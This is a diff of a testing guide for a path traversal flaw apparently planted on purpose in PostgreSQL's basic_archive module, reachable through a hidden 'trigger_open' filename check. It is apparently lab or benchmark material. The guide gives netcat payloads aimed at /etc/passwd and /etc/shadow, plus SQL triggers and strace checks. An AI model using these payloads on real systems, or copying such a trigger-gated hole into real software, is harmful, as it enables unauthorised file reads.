@@ -1,13 +1,15 @@
 # CWE-22 (Path Traversal) Testing Guide for PostgreSQL basic_archive Module
 
 ## Overview
-This guide explains how to test the CWE-22 vulnerability in the PostgreSQL basic_archive module. The vulnerability allows path traversal attacks through two different complex dataflow paths in the try_open_user_path_complex() and try_open_user_path_binary() functions.
+This guide explains how to test the CWE-22 vulnerability in the PostgreSQL basic_archive module. The vulnerability allows path traversal attacks through two different paths:
+1. Simple path traversal using read() from socket
+2. Complex path traversal using recv() from socket with multiple transformations
 
 ## Prerequisites
 - Docker installed
 - Basic knowledge of PostgreSQL
 - Basic knowledge of networking tools (netcat)
-- Understanding of string manipulation and binary operations
+- Understanding of path traversal attacks
 
 ## Step-by-Step Testing Procedure
 
@@ -84,56 +86,56 @@ SELECT pg_reload_conf();
 
 ### 7. Test the Vulnerabilities
 
-#### Testing String Manipulation Path (try_open_user_path_complex)
+#### Testing Simple Path Traversal (try_open_user_path)
 
 ##### Terminal 1 (Listener)
 ```bash
-# Create a listener on port 1234
-nc -l -p 1234
+# Create a listener on port 8080
+nc -l -p 8080
 ```
 
-##### Terminal 2 (Payload)
+##### Terminal 2 (PostgreSQL)
+```sql
+-- Trigger the simple path traversal vulnerability
+SELECT basic_archive_file(NULL, 'trigger_open_test', '/tmp/trigger.txt');
+```
+
+##### Terminal 3 (Payload)
 ```bash
 # Test case 1: Basic traversal
-echo "../../etc/passwd" | nc localhost 1234
+echo "../../etc/passwd" | nc localhost 8080
 
-# Test case 2: Mixed case traversal
-echo "../../EtC/PaSsWd" | nc localhost 1234
+# Test case 2: Path with spaces
+echo "../../etc/pa sswd" | nc localhost 8080
 
 # Test case 3: Path with special characters
-echo "../../etc/passwd#test" | nc localhost 1234
+echo "../../etc/passwd#test" | nc localhost 8080
 ```
 
-##### Terminal 3 (PostgreSQL)
-```sql
--- Trigger the string manipulation vulnerability
-SELECT basic_archive_file(NULL, 'trigger_open_test', '/tmp/trigger.txt');
-```
-
-#### Testing Binary Manipulation Path (try_open_user_path_binary)
+#### Testing Complex Path Traversal (try_open_user_path_complex)
 
 ##### Terminal 1 (Listener)
 ```bash
-# Create a listener on port 1235
-nc -l -p 1235
+# Create a listener on port 8081
+nc -l -p 8081
 ```
 
-##### Terminal 2 (Payload)
-```bash
-# Test case 1: Basic binary traversal
-echo -e "../../etc/passwd" | nc localhost 1235
-
-# Test case 2: Path with binary characters for exploitation
-echo -e "../../etc/passwd\x00\x01\x02" | nc localhost 1235
-
-# Test case 3: Path with extended ASCII for exploitation
-echo -e "../../etc/passwd\x80\x81\x82" | nc localhost 1235
-```
-
-##### Terminal 3 (PostgreSQL)
+##### Terminal 2 (PostgreSQL)
 ```sql
--- Trigger the binary manipulation vulnerability
+-- Trigger the complex path traversal vulnerability
 SELECT basic_archive_file(NULL, 'trigger_open_test', '/tmp/trigger.txt');
+```
+
+##### Terminal 3 (Payload)
+```bash
+# Test case 1: Basic traversal with transformations
+echo "../../etc/passwd" | nc localhost 8081
+
+# Test case 2: Path with mixed case
+echo "../../EtC/PaSsWd" | nc localhost 8081
+
+# Test case 3: Path with backslashes
+echo "..\\..\\etc\\passwd" | nc localhost 8081
 ```
 
 ### 8. Verify the Attacks
@@ -151,50 +153,49 @@ strace -p $(pgrep -f "postgres.*testdb") -e trace=file
 
 ## Expected Results
 
-### String Manipulation Path
-- The try_open_user_path_complex() function will:
-  1. Reverse the input string
-  2. Transform case
-  3. Add/remove padding
-  4. Restore original case
-  5. Attempt to open the target file with fopen()
-- You should see the transformations in the logs
-- The final path should match the original input
+### Simple Path Traversal
+- The try_open_user_path() function will:
+  1. Read input from socket using read()
+  2. Normalize the path (remove whitespace)
+  3. Attempt to open the target file with fopen()
+- You should see the file access attempts in the logs
+- The path should be used directly after normalization
 
-### Binary Manipulation Path
-- The try_open_user_path_binary() function will:
-  1. Convert input to binary
-  2. Apply XOR operations
-  3. Perform bit shifting
-  4. Reverse transformations
-  5. Attempt to open the target file with open()
-- You should see binary operations in the logs
-- The final path should match the original input
+### Complex Path Traversal
+- The try_open_user_path_complex() function will:
+  1. Receive input from socket using recv()
+  2. Normalize the path
+  3. Sanitize path (convert backslashes)
+  4. Join with base directory
+  5. Validate the path
+  6. Attempt to open the target file with open()
+- You should see the transformations in the logs
+- The final path should be constructed from multiple steps
 
 ## Additional Test Cases
 
-### String Manipulation Tests
+### Simple Path Traversal Tests
 ```bash
 # Test case 4: Long path
-echo "../../../../../../../../../../../../../../../../etc/passwd" | nc localhost 1234
+echo "../../../../../../../../../../../../../../../../etc/passwd" | nc localhost 8080
 
-# Test case 5: Path with spaces
-echo "../../etc/pa sswd" | nc localhost 1234
+# Test case 5: Path with Unicode
+echo "../../etc/passwd测试" | nc localhost 8080
 
-# Test case 6: Path with Unicode
-echo "../../etc/passwd测试" | nc localhost 1234
+# Test case 6: Path with null bytes
+echo -e "../../etc/passwd\x00" | nc localhost 8080
 ```
 
-### Binary Manipulation Tests
+### Complex Path Traversal Tests
 ```bash
-# Test case 4: Path with null bytes for exploitation
-echo -e "../../etc/passwd\x00\x00" | nc localhost 1235
+# Test case 4: Path with multiple transformations
+echo "../../etc/./passwd/../shadow" | nc localhost 8081
 
-# Test case 5: Path with control characters for exploitation
-echo -e "../../etc/passwd\x1b\x1c\x1d" | nc localhost 1235
+# Test case 5: Path with encoded characters
+echo "../../etc/p%61sswd" | nc localhost 8081
 
-# Test case 6: Path with random binary data for exploitation
-dd if=/dev/urandom bs=1 count=10 | nc localhost 1235
+# Test case 6: Path with mixed separators
+echo "../../etc/passwd/..\\shadow" | nc localhost 8081
 ```
 
 ## Cleanup
@@ -210,11 +211,10 @@ docker rmi postgres-dev
 ```
 
 ## Notes
-- Both vulnerabilities exist because the functions don't sanitize the path input
-- The string manipulation path uses fopen() as sink
-- The binary manipulation path uses open() as sink
-- Both paths preserve the original input through complex transformations
-- No path validation or sanitization is performed
+- Both vulnerabilities exist because the functions don't properly sanitize the path input
+- The simple path traversal uses read() and fopen() as sink
+- The complex path traversal uses recv() and open() as sink
+- Both paths attempt some form of path handling but fail to prevent traversal
 - The vulnerabilities can be triggered by including "trigger_open" in the filename
 
 ## Security Implications
